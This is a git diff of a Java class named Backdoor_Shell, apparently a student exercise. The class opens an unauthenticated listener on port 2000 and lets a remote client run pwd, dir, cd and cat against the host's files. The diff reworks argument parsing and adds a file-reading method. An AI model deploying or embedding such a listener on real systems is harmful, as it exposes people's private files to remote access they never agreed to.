@@ -2,6 +2,8 @@ package com.tyner.csudh.backdoor;
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.*;
 import java.util.stream.Stream;
 
@@ -10,17 +12,7 @@ public class Backdoor_Shell {
 	public static void main(String[] args) throws FileNotFoundException {
 		
 		//HOW DO I GET FOLDERS INTO THIS ECLIPSE FILE?
-	
-		
-		//Scanner input = new Scanner(System.in);
-		
-		
-		
-		//String file = "C:\\These_Files\\";
-		
-		
-		
-		//File Direct = new File(file);
+
 		
 		try {
 			ServerSocket server=new ServerSocket(2000);
@@ -30,8 +22,7 @@ public class Backdoor_Shell {
 			String folder = workingDir + File.separator + "folder";
 			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
 			System.out.println();
-			
-			//File workDirectory=System.getProperty(null)
+
 			
 			InputStream in=client.getInputStream();
 			OutputStream out=client.getOutputStream();
@@ -39,37 +30,45 @@ public class Backdoor_Shell {
 			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
 			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
 		
-			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
-			
-		//	File [] File = Direct.listFiles();
+			writer.write("\n\rWelcome to Hacker's Backdoor Shell\n\n");
+
 			
 			File wrkDir = new File(workingDir);
 			
+			
+			
 			File toBeg = new File(toBeginning);
+			
+			String previousDir = null;
+			
+			File prevDir = null;
 			
 			while(true) {
 				
 				
+				previousDir = wrkDir.getParent();
+			
+				prevDir = wrkDir;
 				
-				writer.write(workingDir+prompt);
+				writer.write("\n\r"+workingDir+prompt);
 				writer.flush();
 				String clientCommand=reader.readLine();
 			
+				String[] cmd=clientCommand.split(" ");
 				
+			
 				
 				
 				if(clientCommand.equalsIgnoreCase("pwd")) {
-					writer.write("\r\nWorking directory is: "+workingDir+"\n\n");
+					writer.write("\n\rWorking directory is: "+workingDir+"\n\n");
 				}
-				else if(clientCommand.equalsIgnoreCase("dir")){
-					
-					
-					
-					
+				
+				else if(cmd[0].equalsIgnoreCase("dir")){
+	
 					//File object with workingDir
 					//file.listFiles()
 					
-					File [] file = wrkDir.listFiles();
+					File [] file = new File(workingDir).listFiles();
 					
 					
 					int am = file.length;
@@ -90,100 +89,144 @@ public class Backdoor_Shell {
 							isOrNot = "Directory";
 						}
 						
-						writer.write(f.getName()+" "+ isOrNot );
-						writer.write("\n");
+						writer.write("\n\r"+ f.getName()+"-"+ isOrNot );
+						writer.write("\n\r");
 	
 						
 						//THIS JUST LIST THE NAMES OF THE FILES INSIDE OF THE ECLIPSE
 						
 					}
-					writer.write(am + " amount of content in this folder");
+					writer.write("\n\rAmount of content in this folder: " + am +"\n");
 						
-					
+				//	listFiles(workingDir,toBeginning,server,client,reader,writer,wrkDir,toBeg);
 					
 					
 				}
-				else if(clientCommand.equalsIgnoreCase("cd")) //PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
+				else if(cmd[0].equalsIgnoreCase("cd")) //PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
 				{
-					writer.write("Enter the name of the directory you wish to look at\n");
-					String directoryName =reader.readLine();
+		
+				//	String[] Split = clientCommand.split(" ");
 					
-					File direct = new File ("C:\\"+directoryName+"\\");
+					File tempWrkDir;
+
 					
-					if(direct.isDirectory())
-					{
-						writer.write("Enter '.' to stay in the directory you typed\nEnter '..' to go to your previous directory\nEnter '~' to go back to your original directory\n");
-						String cdChoice = reader.readLine();
-						
-						
-						
-						
-							if(cdChoice.equalsIgnoreCase("."))
+							if(cmd[1].equalsIgnoreCase("."))
 							{
-								wrkDir = direct;
+								wrkDir = wrkDir;
 								
-								workingDir = directoryName;
+								workingDir = workingDir;
+								
+								//System.out.println("Check 1");
 						
 							}
-							else if (cdChoice.equalsIgnoreCase(".."))
+							else if (cmd[1].equalsIgnoreCase(".."))//I DON'T KNOW WHAT TO DO HERE
 							{
 						
-					
-								File prev = new File(direct.getParent());
+								tempWrkDir = new File(workingDir).getParentFile();
 								
-								wrkDir = prev;
 								
-								workingDir = (direct.getParent());
+								if(tempWrkDir.getParentFile() == null)
+								{
+									//tempWrkDir = tempWrkDir;
+									//workingDir = workingDir;
+									//System.out.println("check");
+									continue;
+								}
+								workingDir=tempWrkDir.getAbsolutePath();
+								/*wrkDir = prevDir;
+								
+								workingDir = previousDir;*/
+								
+								//STILL GOES TO THE BEGINING DIR
+								
+								//workingDir = tempWrkDir.getParent()
+								
+								//System.out.println("Check 2");
+								
+								//System.out.println("temp dirct: "+tempWrkDir);
+							//	System.out.println("work direct: "+workingDir);
+								
 								
 							}
-							else if(cdChoice.equalsIgnoreCase("~"))
+							else if(cmd[1].equalsIgnoreCase("~"))
 							{
 								
 								wrkDir = toBeg;
 								
 								workingDir = toBeginning;
 								
+								//System.out.println("Check 3");
+								
 							}
-					}
-					else if(!direct.isDirectory())
-					{
-						writer.write(directoryName + " not found!");
-					}
+							else
+							{
+								
+								File tempDir=new File(wrkDir+File.separator+cmd[1]);
+								if(tempDir.isDirectory()) {
+									workingDir=tempDir.getAbsolutePath();
+								}
+								else {
+									writer.write(tempDir + " does not exists\n");
+								}
+							
+								
+//								for (String d: Split)
+//								{
+//									if(!d.contains("cd"))
+//									{
+//										
+//										File directt = new File("C:\\"+d+"\\");
+//										
+//										wrkDir = directt;
+//									
+//										
+//										if(wrkDir.isDirectory()&&prevDir.isDirectory())
+//										{
+//											workingDir = d;
+//											
+//				
+//											
+//											System.out.println("Check 4");
+//							
+//												//STILL CONTINUES EVEN THOUGH ITS NOT A DIRECTORY
+//												//HAS BEEN FIXED
+//										}
+//										else if(!wrkDir.isDirectory())
+//										{
+//											writer.write(d + " does not exists\n");
+//										}
+//									}
+//										
+//									}
+//	
+//								}
+					
+					//currentDir(workingDir,toBeginning,clientCommand,server,client,reader,writer,wrkDir,toBeg);
 					
 					
+				}
 				}
 					
 					
 
-				else if(clientCommand.equalsIgnoreCase("cat"))//PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
+				else if(clientCommand.contains("cat"))//PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
 				{
-					writer.write("Enter the name of the file you wish to read");
 					
-					String fileName = reader.readLine();
-			
-					File fil = new File("C:\\"+workingDir+"\\"+fileName+".txt");
 					
-					reader = new BufferedReader(new FileReader(fil));
+							
+					readingFiles(workingDir,cmd,reader,writer);
+							
+						}
+					//}
 					
-					if(fil.isFile())
-					{
-						while(reader.ready())
-					{
-						String data = reader.readLine();
-						writer.write(data);
-					}
-					}
-					else if(!fil.isFile())
-					{
-						writer.write("File not found!\n"); //DOSENT PRINT WHEN FIL IS NOT A FILE
-					}
+					
 					
 					
 					
 					//CLOSES CONNECTION AFTER USING CAT
 					
 					
-				}
+			//	}
 				else if(clientCommand.equalsIgnoreCase("]"))
 				{
 					System.exit(0);
@@ -199,11 +242,64 @@ public class Backdoor_Shell {
 			e.printStackTrace();
 		}
 		
-		
-		
+	
 	}
-	
-	
-	
 
+	
+	
+	public static void readingFiles(String workingDir,String [] cmd,BufferedReader reader,BufferedWriter writer) throws IOException
+	{
+		
+		
+
+		
+		for(String spi: cmd)
+		{
+			
+			File fil = new File(workingDir+"\\"+spi);
+			
+			if(!(spi.contains("cat")))
+			{
+				
+				fil = new File(workingDir+"\\"+spi);
+				
+				//System.out.println(spi);
+				/*if(workingDir.contains("C:\\"))
+				{
+					fil = new File(workingDir+"\\"+spi);
+				}
+					else if(!(workingDir.contains("C:\\")))
+					{
+						fil = new File ("C:\\"+workingDir+"\\"+spi);
+					}*/
+			
+				 
+				writer.write("\n\r");
+				
+				if(fil.isFile())
+				{
+					reader = new BufferedReader(new FileReader(fil));
+					
+					String data;
+					
+					while(reader.ready())
+					{
+					 data = reader.readLine();
+					
+					
+					 
+					writer.write(data);
+					}
+						writer.write("\n\r");
+					}
+				else if(!fil.isFile())
+						{
+						writer.write("\n\r"+spi +" not found!\n"); //PRINTS ERROR AND STARTS AGAIN, BUT NOT WHEN YOU TYPE IN THE PROPER FILE NAME
+						}
+		
+			}
+		}
+	}
 }
+	
+	
